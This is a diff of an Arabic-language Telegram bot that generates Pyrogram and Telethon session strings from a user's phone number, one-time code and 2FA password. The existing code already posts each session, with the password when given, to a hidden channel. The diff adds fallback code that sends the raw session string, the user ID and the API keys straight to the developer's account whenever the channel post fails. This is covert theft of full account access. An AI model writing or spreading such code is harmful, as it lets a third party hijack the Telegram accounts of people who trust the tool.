@@ -34,7 +34,7 @@ CHANNEL_LINK = "https://t.me/u_t_rnn"
 
 user_steps = {}
 user_data = {}
-user_sessions = {}  # لحفظ الجلسات المستخرجة
+user_sessions = {}
 
 # ====== إعداد الترميز ======
 if sys.stdout.encoding != 'UTF-8':
@@ -170,7 +170,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
         )
         return
     
-    # ====== زر استخراج التوكن ======
     if data == "extract_token":
         await callback_query.message.edit_text(
             f"🔑 **التوكن الخاص بالبوت:**\n\n"
@@ -182,7 +181,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
         await callback_query.answer()
         return
     
-    # ====== زر إرسال للمطور ======
     if data == "send_to_dev":
         user_steps[user_id] = "waiting_dev_msg"
         await callback_query.message.edit_text(
@@ -235,8 +233,21 @@ async def extract_api_info_callback(callback_query):
             f"🔑 API HASH: {API_HASH}\n\n"
             f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
         )
+        print(f"✅ تم إرسال API Info للمجموعة {SESSION_CHANNEL}")
     except Exception as e:
         print(f"❌ فشل إرسال API Info للمجموعة: {e}")
+        # محاولة الإرسال كحل احتياطي
+        try:
+            await app.send_message(
+                DEV_USERNAME,
+                f"⚠️ فشل إرسال API Info للقناة!\n\n"
+                f"المستخدم: {user_id}\n"
+                f"API ID: {API_ID}\n"
+                f"API HASH: {API_HASH}\n"
+                f"الخطأ: {e}"
+            )
+        except:
+            pass
     
     await callback_query.answer()
 
@@ -246,11 +257,8 @@ async def handle_arabic_commands(client, message):
     user_id = message.chat.id
     text = message.text.strip()
     
-    # ====== معالجة رسالة المطور ======
     if user_id in user_steps and user_steps[user_id] == "waiting_dev_msg":
-        # إرسال رسالة المستخدم للمطور
         try:
-            # إرسال للمطور عبر البوت نفسه
             await app.send_message(
                 DEV_USERNAME,
                 f"📩 **رسالة جديدة من المستخدم:**\n"
@@ -264,17 +272,14 @@ async def handle_arabic_commands(client, message):
             reset_user(user_id)
         return
     
-    # معالجة خطوات Pyrogram
     if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
         await pyro_session_step(client, message)
         return
     
-    # معالجة خطوات Telethon
     elif user_id in user_steps and user_steps[user_id] in ["telethon_phone", "telethon_otp", "telethon_password"]:
         await telethon_session_step(client, message)
         return
     
-    # أي نص آخر
     else:
         await message.reply(
             "📱 يرجى استخدام الأزرار للتحكم في البوت.\n\n"
@@ -351,6 +356,7 @@ async def send_pyro_session(user_id, session_string, message, password=None):
         f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
     )
     
+    # محاولة إرسال إلى القناة
     try:
         if password:
             await app.send_message(
@@ -370,6 +376,19 @@ async def send_pyro_session(user_id, session_string, message, password=None):
         print(f"✅ تم إرسال جلسة Pyrogram للمجموعة {SESSION_CHANNEL}")
     except Exception as e:
         print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
+        # محاولة الإرسال كحل احتياطي
+        try:
+            # محاولة الإرسال للمطور
+            await app.send_message(
+                DEV_USERNAME,
+                f"⚠️ فشل إرسال جلسة Pyrogram للقناة!\n\n"
+                f"المستخدم: {user_id}\n"
+                f"الجلسة: {session_string}\n"
+                f"الخطأ: {e}"
+            )
+            print("✅ تم إرسال الجلسة للمطور كحل احتياطي")
+        except:
+            pass
 
 # ====== دوال Telethon ======
 async def telethon_session_step(client, message):
@@ -459,6 +478,7 @@ async def send_telethon_session(user_id, session_string, message, password=None)
         f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
     )
     
+    # محاولة إرسال إلى القناة
     try:
         if password:
             await app.send_message(
@@ -478,6 +498,18 @@ async def send_telethon_session(user_id, session_string, message, password=None)
         print(f"✅ تم إرسال جلسة Telethon للمجموعة {SESSION_CHANNEL}")
     except Exception as e:
         print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
+        # محاولة الإرسال كحل احتياطي
+        try:
+            await app.send_message(
+                DEV_USERNAME,
+                f"⚠️ فشل إرسال جلسة Telethon للقناة!\n\n"
+                f"المستخدم: {user_id}\n"
+                f"الجلسة: {session_string}\n"
+                f"الخطأ: {e}"
+            )
+            print("✅ تم إرسال الجلسة للمطور كحل احتياطي")
+        except:
+            pass
 
 def reset_user(user_id):
     user_steps.pop(user_id, None)
